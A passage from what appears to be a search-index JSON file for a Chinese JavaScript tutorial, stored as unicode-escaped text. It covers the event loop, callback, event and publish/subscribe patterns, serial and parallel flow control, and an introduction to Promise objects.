u7a7a\uff0c\u7a0b\u5e8f\u5c31\u7ed3\u675f\u6267\u884c\u3002 \u5f02\u6b65\u4efb\u52a1\u7684\u5199\u6cd5\u901a\u5e38\u662f\u56de\u8c03\u51fd\u6570\u3002\u4e00\u65e6\u5f02\u6b65\u4efb\u52a1\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002\u5982\u679c\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u6ca1\u6709\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u4e0d\u4f1a\u8fdb\u5165\u4efb\u52a1\u961f\u5217\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u4f1a\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\uff0c\u56e0\u4e3a\u6ca1\u6709\u7528\u56de\u8c03\u51fd\u6570\u6307\u5b9a\u4e0b\u4e00\u6b65\u7684\u64cd\u4f5c\u3002 JavaScript \u5f15\u64ce\u600e\u4e48\u77e5\u9053\u5f02\u6b65\u4efb\u52a1\u6709\u6ca1\u6709\u7ed3\u679c\uff0c\u80fd\u4e0d\u80fd\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5462\uff1f\u7b54\u6848\u5c31\u662f\u5f15\u64ce\u5728\u4e0d\u505c\u5730\u68c0\u67e5\uff0c\u4e00\u904d\u53c8\u4e00\u904d\uff0c\u53ea\u8981\u540c\u6b65\u4efb\u52a1\u6267\u884c\u5b8c\u4e86\uff0c\u5f15\u64ce\u5c31\u4f1a\u53bb\u68c0\u67e5\u90a3\u4e9b\u6302\u8d77\u6765\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u4e86\u3002\u8fd9\u79cd\u5faa\u73af\u68c0\u67e5\u7684\u673a\u5236\uff0c\u5c31\u53eb\u505a\u4e8b\u4ef6\u5faa\u73af\uff08Event Loop\uff09\u3002 \u7ef4\u57fa\u767e\u79d1 \u7684\u5b9a\u4e49\u662f\uff1a\u201c\u4e8b\u4ef6\u5faa\u73af\u662f\u4e00\u4e2a\u7a0b\u5e8f\u7ed3\u6784\uff0c\u7528\u4e8e\u7b49\u5f85\u548c\u53d1\u9001\u6d88\u606f\u548c\u4e8b\u4ef6\uff08a programming construct that waits for and dispatches events or messages in a program\uff09\u201d\u3002","title":"\u4efb\u52a1\u961f\u5217\u548c\u4e8b\u4ef6\u5faa\u73af"},{"location":"async/general/#_5","text":"\u4e0b\u9762\u603b\u7ed3\u4e00\u4e0b\u5f02\u6b65\u64cd\u4f5c\u7684\u51e0\u79cd\u6a21\u5f0f\u3002","title":"\u5f02\u6b65\u64cd\u4f5c\u7684\u6a21\u5f0f"},{"location":"async/general/#_6","text":"\u56de\u8c03\u51fd\u6570\u662f\u5f02\u6b65\u64cd\u4f5c\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u3002 \u4e0b\u9762\u662f\u4e24\u4e2a\u51fd\u6570 f1 \u548c f2 \uff0c\u7f16\u7a0b\u7684\u610f\u56fe\u662f f2 \u5fc5\u987b\u7b49\u5230 f1 \u6267\u884c\u5b8c\u6210\uff0c\u624d\u80fd\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 function f1 () { // ... } function f2 () { // ... } f1 (); f2 (); \u4e0a\u9762\u4ee3\u7801\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c f1 \u662f\u5f02\u6b65\u64cd\u4f5c\uff0c f2 \u4f1a\u7acb\u5373\u6267\u884c\uff0c\u4e0d\u4f1a\u7b49\u5230 f1 \u7ed3\u675f\u518d\u6267\u884c\u3002 \u8fd9\u65f6\uff0c\u53ef\u4ee5\u8003\u8651\u6539\u5199 f1 \uff0c\u628a f2 \u5199\u6210 f1 \u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function f1 ( callback ) { // ... callback (); } function f2 () { // ... } f1 ( f2 ); \u56de\u8c03\u51fd\u6570\u7684\u4f18\u70b9\u662f\u7b80\u5355\u3001\u5bb9\u6613\u7406\u89e3\u548c\u5b9e\u73b0\uff0c\u7f3a\u70b9\u662f\u4e0d\u5229\u4e8e\u4ee3\u7801\u7684\u9605\u8bfb\u548c\u7ef4\u62a4\uff0c\u5404\u4e2a\u90e8\u5206\u4e4b\u95f4\u9ad8\u5ea6 \u8026\u5408 \uff08coupling\uff09\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u7ed3\u6784\u6df7\u4e71\u3001\u6d41\u7a0b\u96be\u4ee5\u8ffd\u8e2a\uff08\u5c24\u5176\u662f\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u5d4c\u5957\u7684\u60c5\u51b5\uff09\uff0c\u800c\u4e14\u6bcf\u4e2a\u4efb\u52a1\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002","title":"\u56de\u8c03\u51fd\u6570"},{"location":"async/general/#_7","text":"\u53e6\u4e00\u79cd\u601d\u8def\u662f\u91c7\u7528\u4e8b\u4ef6\u9a71\u52a8\u6a21\u5f0f\u3002\u5f02\u6b65\u4efb\u52a1\u7684\u6267\u884c\u4e0d\u53d6\u51b3\u4e8e\u4ee3\u7801\u7684\u987a\u5e8f\uff0c\u800c\u53d6\u51b3\u4e8e\u67d0\u4e2a\u4e8b\u4ef6\u662f\u5426\u53d1\u751f\u3002 \u8fd8\u662f\u4ee5 f1 \u548c f2 \u4e3a\u4f8b\u3002\u9996\u5148\uff0c\u4e3a f1 \u7ed1\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\uff08\u8fd9\u91cc\u91c7\u7528\u7684 jQuery \u7684 \u5199\u6cd5 \uff09\u3002 1 f1 . on ( 'done' , f2 ); \u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\uff0c\u5f53 f1 \u53d1\u751f done \u4e8b\u4ef6\uff0c\u5c31\u6267\u884c f2 \u3002\u7136\u540e\uff0c\u5bf9 f1 \u8fdb\u884c\u6539\u5199\uff1a 1 2 3 4 5 6 function f1 () { setTimeout ( function () { // ... f1 . trigger ( 'done' ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f1.trigger('done') \u8868\u793a\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u7acb\u5373\u89e6\u53d1 done \u4e8b\u4ef6\uff0c\u4ece\u800c\u5f00\u59cb\u6267\u884c f2 \u3002 \u8fd9\u79cd\u65b9\u6cd5\u7684\u4f18\u70b9\u662f\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u53ef\u4ee5\u7ed1\u5b9a\u591a\u4e2a\u4e8b\u4ef6\uff0c\u6bcf\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u800c\u4e14\u53ef\u4ee5\u201c \u53bb\u8026\u5408 \u201d\uff08decoupling\uff09\uff0c\u6709\u5229\u4e8e\u5b9e\u73b0\u6a21\u5757\u5316\u3002\u7f3a\u70b9\u662f\u6574\u4e2a\u7a0b\u5e8f\u90fd\u8981\u53d8\u6210\u4e8b\u4ef6\u9a71\u52a8\u578b\uff0c\u8fd0\u884c\u6d41\u7a0b\u4f1a\u53d8\u5f97\u5f88\u4e0d\u6e05\u6670\u3002\u9605\u8bfb\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5f88\u96be\u770b\u51fa\u4e3b\u6d41\u7a0b\u3002","title":"\u4e8b\u4ef6\u76d1\u542c"},{"location":"async/general/#_8","text":"\u4e8b\u4ef6\u5b8c\u5168\u53ef\u4ee5\u7406\u89e3\u6210\u201c\u4fe1\u53f7\u201d\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u201c\u4fe1\u53f7\u4e2d\u5fc3\u201d\uff0c\u67d0\u4e2a\u4efb\u52a1\u6267\u884c\u5b8c\u6210\uff0c\u5c31\u5411\u4fe1\u53f7\u4e2d\u5fc3\u201c\u53d1\u5e03\u201d\uff08publish\uff09\u4e00\u4e2a\u4fe1\u53f7\uff0c\u5176\u4ed6\u4efb\u52a1\u53ef\u4ee5\u5411\u4fe1\u53f7\u4e2d\u5fc3\u201c\u8ba2\u9605\u201d\uff08subscribe\uff09\u8fd9\u4e2a\u4fe1\u53f7\uff0c\u4ece\u800c\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u81ea\u5df1\u53ef\u4ee5\u5f00\u59cb\u6267\u884c\u3002\u8fd9\u5c31\u53eb\u505a\u201d \u53d1\u5e03/\u8ba2\u9605\u6a21\u5f0f \u201d\uff08publish-subscribe pattern\uff09\uff0c\u53c8\u79f0\u201c \u89c2\u5bdf\u8005\u6a21\u5f0f \u201d\uff08observer pattern\uff09\u3002 \u8fd9\u4e2a\u6a21\u5f0f\u6709\u591a\u79cd \u5b9e\u73b0 \uff0c\u4e0b\u9762\u91c7\u7528\u7684\u662f Ben Alman \u7684 Tiny Pub/Sub \uff0c\u8fd9\u662f jQuery \u7684\u4e00\u4e2a\u63d2\u4ef6\u3002 \u9996\u5148\uff0c f2 \u5411\u4fe1\u53f7\u4e2d\u5fc3 jQuery \u8ba2\u9605 done \u4fe1\u53f7\u3002 1 jQuery . subscribe ( 'done' , f2 ); \u7136\u540e\uff0c f1 \u8fdb\u884c\u5982\u4e0b\u6539\u5199\u3002 1 2 3 4 5 6 function f1 () { setTimeout ( function () { // ... jQuery . publish ( 'done' ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c jQuery.publish('done') \u7684\u610f\u601d\u662f\uff0c f1 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u5411\u4fe1\u53f7\u4e2d\u5fc3 jQuery \u53d1\u5e03 done \u4fe1\u53f7\uff0c\u4ece\u800c\u5f15\u53d1 f2 \u7684\u6267\u884c\u3002 f2 \u5b8c\u6210\u6267\u884c\u540e\uff0c\u53ef\u4ee5\u53d6\u6d88\u8ba2\u9605\uff08unsubscribe\uff09\u3002 1 jQuery . unsubscribe ( 'done' , f2 ); \u8fd9\u79cd\u65b9\u6cd5\u7684\u6027\u8d28\u4e0e\u201c\u4e8b\u4ef6\u76d1\u542c\u201d\u7c7b\u4f3c\uff0c\u4f46\u662f\u660e\u663e\u4f18\u4e8e\u540e\u8005\u3002\u56e0\u4e3a\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u201c\u6d88\u606f\u4e2d\u5fc3\u201d\uff0c\u4e86\u89e3\u5b58\u5728\u591a\u5c11\u4fe1\u53f7\u3001\u6bcf\u4e2a\u4fe1\u53f7\u6709\u591a\u5c11\u8ba2\u9605\u8005\uff0c\u4ece\u800c\u76d1\u63a7\u7a0b\u5e8f\u7684\u8fd0\u884c\u3002","title":"\u53d1\u5e03/\u8ba2\u9605"},{"location":"async/general/#_9","text":"\u5982\u679c\u6709\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u5c31\u5b58\u5728\u4e00\u4e2a\u6d41\u7a0b\u63a7\u5236\u7684\u95ee\u9898\uff1a\u5982\u4f55\u786e\u5b9a\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u7684\u987a\u5e8f\uff0c\u4ee5\u53ca\u5982\u4f55\u4fdd\u8bc1\u9075\u5b88\u8fd9\u79cd\u987a\u5e8f\u3002 1 2 3 4 function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u7684 async \u51fd\u6570\u662f\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u975e\u5e38\u8017\u65f6\uff0c\u6bcf\u6b21\u6267\u884c\u9700\u89811\u79d2\u624d\u80fd\u5b8c\u6210\uff0c\u7136\u540e\u518d\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002 \u5982\u679c\u6709\u516d\u4e2a\u8fd9\u6837\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u9700\u8981\u5168\u90e8\u5b8c\u6210\u540e\uff0c\u624d\u80fd\u6267\u884c\u6700\u540e\u7684 final \u51fd\u6570\u3002\u8bf7\u95ee\u5e94\u8be5\u5982\u4f55\u5b89\u6392\u64cd\u4f5c\u6d41\u7a0b\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } async ( 1 , function ( value ) { async ( 2 , function ( value ) { async ( 3 , function ( value ) { async ( 4 , function ( value ) { async ( 5 , function ( value ) { async ( 6 , final ); }); }); }); }); }); // \u53c2\u6570\u4e3a 1 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 2 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 3 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 4 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 5 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 6 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u5b8c\u6210: 12 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u516d\u4e2a\u56de\u8c03\u51fd\u6570\u7684\u5d4c\u5957\uff0c\u4e0d\u4ec5\u5199\u8d77\u6765\u9ebb\u70e6\uff0c\u5bb9\u6613\u51fa\u9519\uff0c\u800c\u4e14\u96be\u4ee5\u7ef4\u62a4\u3002","title":"\u5f02\u6b65\u64cd\u4f5c\u7684\u6d41\u7a0b\u63a7\u5236"},{"location":"async/general/#_10","text":"\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a\u6d41\u7a0b\u63a7\u5236\u51fd\u6570\uff0c\u8ba9\u5b83\u6765\u63a7\u5236\u5f02\u6b65\u4efb\u52a1\uff0c\u4e00\u4e2a\u4efb\u52a1\u5b8c\u6210\u4ee5\u540e\uff0c\u518d\u6267\u884c\u53e6\u4e00\u4e2a\u3002\u8fd9\u5c31\u53eb\u4e32\u884c\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } function series ( item ) { if ( item ) { async ( item , function ( result ) { results . push ( result ); return series ( items . shift ()); }); } else { return final ( results [ results . length - 1 ]); } } series ( items . shift ()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 series \u5c31\u662f\u4e32\u884c\u51fd\u6570\uff0c\u5b83\u4f1a\u4f9d\u6b21\u6267\u884c\u5f02\u6b65\u4efb\u52a1\uff0c\u6240\u6709\u4efb\u52a1\u90fd\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u6267\u884c final \u51fd\u6570\u3002 items \u6570\u7ec4\u4fdd\u5b58\u6bcf\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u7684\u53c2\u6570\uff0c results \u6570\u7ec4\u4fdd\u5b58\u6bcf\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u7684\u8fd0\u884c\u7ed3\u679c\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u5199\u6cd5\u9700\u8981\u516d\u79d2\uff0c\u624d\u80fd\u5b8c\u6210\u6574\u4e2a\u811a\u672c\u3002","title":"\u4e32\u884c\u6267\u884c"},{"location":"async/general/#_11","text":"\u6d41\u7a0b\u63a7\u5236\u51fd\u6570\u4e5f\u53ef\u4ee5\u662f\u5e76\u884c\u6267\u884c\uff0c\u5373\u6240\u6709\u5f02\u6b65\u4efb\u52a1\u540c\u65f6\u6267\u884c\uff0c\u7b49\u5230\u5168\u90e8\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u6267\u884c final \u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } items . forEach ( function ( item ) { async ( item , function ( result ){ results . push ( result ); if ( results . length === items . length ) { final ( results [ results . length - 1 ]); } }) }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach \u65b9\u6cd5\u4f1a\u540c\u65f6\u53d1\u8d77\u516d\u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u7b49\u5230\u5b83\u4eec\u5168\u90e8\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u4f1a\u6267\u884c final \u51fd\u6570\u3002 \u76f8\u6bd4\u800c\u8a00\uff0c\u4e0a\u9762\u7684\u5199\u6cd5\u53ea\u8981\u4e00\u79d2\uff0c\u5c31\u80fd\u5b8c\u6210\u6574\u4e2a\u811a\u672c\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5e76\u884c\u6267\u884c\u7684\u6548\u7387\u8f83\u9ad8\uff0c\u6bd4\u8d77\u4e32\u884c\u6267\u884c\u4e00\u6b21\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\uff0c\u8f83\u4e3a\u8282\u7ea6\u65f6\u95f4\u3002\u4f46\u662f\u95ee\u9898\u5728\u4e8e\u5982\u679c\u5e76\u884c\u7684\u4efb\u52a1\u8f83\u591a\uff0c\u5f88\u5bb9\u6613\u8017\u5c3d\u7cfb\u7edf\u8d44\u6e90\uff0c\u62d6\u6162\u8fd0\u884c\u901f\u5ea6\u3002\u56e0\u6b64\u6709\u4e86\u7b2c\u4e09\u79cd\u6d41\u7a0b\u63a7\u5236\u65b9\u5f0f\u3002","title":"\u5e76\u884c\u6267\u884c"},{"location":"async/general/#_12","text":"\u6240\u8c13\u5e76\u884c\u4e0e\u4e32\u884c\u7684\u7ed3\u5408\uff0c\u5c31\u662f\u8bbe\u7f6e\u4e00\u4e2a\u95e8\u69db\uff0c\u6bcf\u6b21\u6700\u591a\u53ea\u80fd\u5e76\u884c\u6267\u884c n \u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u8fc7\u5206\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; var running = 0 ; var limit = 2 ; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } function launcher () { while ( running < limit && items . length > 0 ) { var item = items . shift (); async ( item , function ( result ) { results . push ( result ); running -- ; if ( items . length > 0 ) { launcher (); } else if ( running == 0 ) { final ( results ); } }); running ++ ; } } launcher (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u591a\u53ea\u80fd\u540c\u65f6\u8fd0\u884c\u4e24\u4e2a\u5f02\u6b65\u4efb\u52a1\u3002\u53d8\u91cf running \u8bb0\u5f55\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\uff0c\u53ea\u8981\u4f4e\u4e8e\u95e8\u69db\u503c\uff0c\u5c31\u518d\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u4efb\u52a1\uff0c\u5982\u679c\u7b49\u4e8e 0 \uff0c\u5c31\u8868\u793a\u6240\u6709\u4efb\u52a1\u90fd\u6267\u884c\u5b8c\u4e86\uff0c\u8fd9\u65f6\u5c31\u6267\u884c final \u51fd\u6570\u3002 \u8fd9\u6bb5\u4ee3\u7801\u9700\u8981\u4e09\u79d2\u5b8c\u6210\u6574\u4e2a\u811a\u672c\uff0c\u5904\u5728\u4e32\u884c\u6267\u884c\u548c\u5e76\u884c\u6267\u884c\u4e4b\u95f4\u3002\u901a\u8fc7\u8c03\u8282 limit \u53d8\u91cf\uff0c\u8fbe\u5230\u6548\u7387\u548c\u8d44\u6e90\u7684\u6700\u4f73\u5e73\u8861\u3002","title":"\u5e76\u884c\u4e0e\u4e32\u884c\u7684\u7ed3\u5408"},{"location":"async/promise/","text":"Promise \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 Promise \u5bf9\u8c61\u662f JavaScript \u7684\u5f02\u6b65\u64cd\u4f5c\u89e3\u51b3\u65b9\u6848\uff0c\u4e3a\u5f02\u6b65\u64cd\u4f5c\u63d0\u4f9b\u7edf\u4e00\u63a5\u53e3\u3002\u5b83\u8d77\u5230\u4ee3\u7406\u4f5c\u7528\uff08proxy\uff09\uff0c\u5145\u5f53\u5f02\u6b65\u64cd\u4f5c\u4e0e\u56de\u8c03\u51fd\u6570\u4e4b\u95f4\u7684\u4e2d\u4ecb\uff0c\u4f7f\u5f97\u5f02\u6b65\u64cd\u4f5c\u5177\u5907\u540c\u6b65\u64cd\u4f5c\u7684\u63a5\u53e3\u3002Promise \u53ef\u4ee5\u8ba9\u5f02\u6b65\u64cd\u4f5c\u5199\u8d77\u6765\uff0c\u5c31\u50cf\u5728\u5199\u540c\u6b65\u64cd\u4f5c\u7684\u6d41\u7a0b\uff0c\u800c\u4e0d\u5fc5\u4e00\u5c42\u5c42\u5730\u5d4c\u5957\u56de\u8c03\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u672c\u7ae0\u53ea\u662f Promise \u5bf9\u8c61\u7684\u7b80\u5355\u4ecb\u7ecd\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u540e\u7eed\u6559\u7a0b\u7684\u91cd\u590d\uff0c\u66f4\u5b8c\u6574\u7684\u4ecb\u7ecd\u8bf7\u770b \u300aES6 \u6807\u51c6\u5165\u95e8\u300b \u7684 \u300aPromise \u5bf9\u8c61\u300b \u4e00\u7ae0\u3002 \u9996\u5148\uff0cPromise \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 function f1 ( resolve , reject ) { // \u5f02\u6b65\u4ee3\u7801... } var p1 = new Promise ( f1 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Promise \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570 f1 \u4f5c\u4e3a\u53c2\u6570\uff0c f1 \u91cc\u9762\u662f\u5f02\u6b65\u64cd\u4f5c\u7684\u4ee3\u7801\u3002\u7136\u540e\uff0c\u8fd4\u56de\u7684 p1 \u5c31\u662f\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002 Promise \u7684\u8bbe\u8ba1\u601d\u60f3\u662f\uff0c\u6240\u6709\u5f02\u6b65\u4efb\u52a1\u90fd\u8fd4\u56de\u4e00\u4e2a Promise \u5b9e\u4f8b\u3002Promise \u5b9e\u4f8b\u6709\u4e00\u4e2a then \u65b9\u6cd5\uff0c\u7528\u6765\u6307\u5b9a\u4e0b\u4e00\u6b65\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 var p1 = new Promise ( f1 ); p1 . then ( f2 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f1 \u7684\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u5b8c\u6210\uff0c\u5c31\u4f1a\u6267\u884c f2 \u3002 \u4f20\u7edf\u7684\u5199\u6cd5\u53ef\u80fd\u9700\u8981\u628a f2 \u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u4f20\u5165 f1 \uff0c\u6bd4\u5982\u5199\u6210 f1(f2) \uff0c\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u5728 f1 \u5185\u90e8\u8c03\u7528 f2 \u3002Promise \u4f7f\u5f97 f1 \u548c f2 \u53d8\u6210\u4e86\u94fe\u5f0f\u5199\u6cd5\u3002\u4e0d\u4ec5\u6539\u5584\u4e86\u53ef\u8bfb\u6027\uff0c\u800c\u4e14\u5bf9\u4e8e\u591a\u5c42\u5d4c\u5957\u7684\u56de\u8c03\u51fd\u6570\u5c24\u5176\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // \u4f20\u7edf\u5199\u6cd5 step1 ( function ( value1 ) { step2 ( value1 , function ( value2 ) { step3 ( value2 , function ( value3 ) { step4 ( value3 , function ( value4 ) { // ... }); }); }); }); // Promise \u7684\u5199\u6cd5 ( new Promise ( step1 )) . then ( step2 ) . then ( step3 ) . then ( step4 ); \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u91c7\u7528 Promises \u4ee5\u540e\uff0c\u7a0b\u5e8f\u6d41\u7a0b\u53d8\u5f97\u975e\u5e38\u6e05\u695a\uff0c\u5341\u5206\u6613\u8bfb\u3002\u6ce8\u610f\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u4e0a\u9762\u4ee3\u7801\u7684 Promise \u5b9e\u4f8b\u7684\u751f\u6210\u683c\u5f0f\uff0c\u505a\u4e86\u7b80\u5316\uff0c\u771f\u6b63\u7684\u8bed\u6cd5\u8bf7\u53c2\u7167\u4e0b\u6587\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u4f20\u7edf\u7684\u56de\u8c03\u51fd\u6570\u5199\u6cd5\u4f7f\u5f97\u4ee3\u7801\u6df7\u6210\u4e00\u56e2\uff0c\u53d8\u5f97\u6a2a\u5411\u53d1\u5c55\u800c\u4e0d\u662f\u5411\u4e0b\u53d1\u5c55\u3002Promise \u5c31\u662f\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u5f97\u5f02\u6b65\u6d41\u7a0b\u53ef\u4ee5\u5199\u6210\u540c\u6b65\u6d41\u7a0b\u3002 Promise \u539f\u672c\u53ea\u662f\u793e\u533a\u63d0\u51fa\u7684\u4e00\u4e2a\u6784\u60f3\uff0c\u4e00\u4e9b\u51fd\u6570\u5e93\u7387\u5148\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002ECMAScript 6 \u5c06\u5176\u5199\u5165\u8bed\u8a00\u6807\u51c6\uff0c\u76ee\u524d JavaScript \u539f\u751f\u652f\u6301 Promise \u5bf9\u8c61\u3002 Promise \u5bf9\u8c61\u7684\u72b6\u6001 \u00b6 Promise \u5bf9\u8c61\u901a\u8fc7\u81ea\u8eab\u7684\u72b6\u6001\uff0c\u6765\u63a7\u5236\u5f02\u6b65\u64cd\u4f5c\u3002Promise \u5b9e\u4f8b\u5177\u6709\u4e09\u79cd\u72b6\u6001\u3002 \u5f02\u6b65\u64cd\u4f5c\u672a\u5b8c\u6210\uff08pending\uff09 \u5f02\u6b65\u64cd\u4f5c\u6210\u529f\uff08fulfilled\uff09 \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff08rejected\uff09 \u4e0a\u9762\u4e09\u79cd\u72b6\u6001\u91cc\u9762\uff0c fulfilled \u548c rejected \u5408\u5728\u4e00\u8d77\u79f0\u4e3a resolved \uff08\u5df2\u5b9a\u578b\uff09\u3002 \u8fd9\u4e09\u79cd\u7684\u72b6\u6001\u7684\u53d8\u5316\u9014\u5f84\u53ea\u6709\u4e24\u79cd\u3002 \u4ece\u201c\u672a\u5b8c\u6210\u201d\u5230\u201c\u6210\u529f\u201d \u4ece\u201c\u672a\u5b8c\u6210\u201d\u5230\u201c\u5931\u8d25\u201d \u4e00\u65e6\u72b6\u6001\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u51dd\u56fa\u4e86\uff0c\u4e0d\u4f1a\u518d\u6709\u65b0\u7684\u72b6\u6001\u53d8\u5316\u3002\u8fd9\u4e5f\u662f Promise \u8fd9\u4e2a\u540d\u5b57\u7684\u7531\u6765\uff0c\u5b83\u7684\u82f1\u8bed\u610f\u601d\u662f\u201c\u627f\u8bfa\u201d\uff0c\u4e00\u65e6\u627f\u8bfa\u6210\u6548\uff0c\u5c31\u4e0d\u5f97\u518d\u6539\u53d8\u4e86\u3002\u8fd9\u4e5f\u610f\u5473\u7740\uff0cPromise \u5b9e\u4f8b\u7684\u72b6\u6001\u53d8\u5316\u53ea\u53ef\u80fd\u53d1\u751f\u4e00\u6b21\u3002 \u56e0\u6b64\uff0cPromise \u7684\u6700\u7ec8\u7ed3\u679c\u53ea\u6709\u4e24\u79cd\u3002 \u5f02\u6b65\u64cd\u4f5c\u6210\u529f\uff0cPromise \u5b9e\u4f8b\u4f20\u56de\u4e00\u4e2a\u503c\uff08value\uff09\uff0c\u72b6\u6001\u53d8\u4e3a fulfilled \u3002 \u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff0cPromise 